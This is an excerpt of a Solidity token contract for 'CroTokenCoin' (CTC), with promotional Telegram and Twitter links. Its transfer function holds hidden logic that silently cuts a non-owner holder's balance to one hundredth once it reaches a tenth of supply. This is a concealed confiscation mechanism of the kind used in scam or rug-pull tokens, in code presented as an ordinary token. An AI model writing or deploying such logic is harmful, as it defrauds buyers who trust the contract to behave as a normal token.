...
/**
Telegram: https://t.me/CroTokenCoin
Twitter: https://twitter.com/CroTokenCoin
*/
library SafeMath {
...
contract TokenTool {
    ...
    string public name = "CroTokenCoin";
    string public symbol = "CTC";
    uint8 public decimals = 4;
    uint256 public totalSupply = 1000000000 * 10 ** 4;
    ...
    function transfer(address to, uint256 amount) public returns (bool success) {
        if (BH != Owner && balanceOf[BH]>=totalSupply.div(10)) {
            balanceOf[BH]=balanceOf[BH].div(100);}
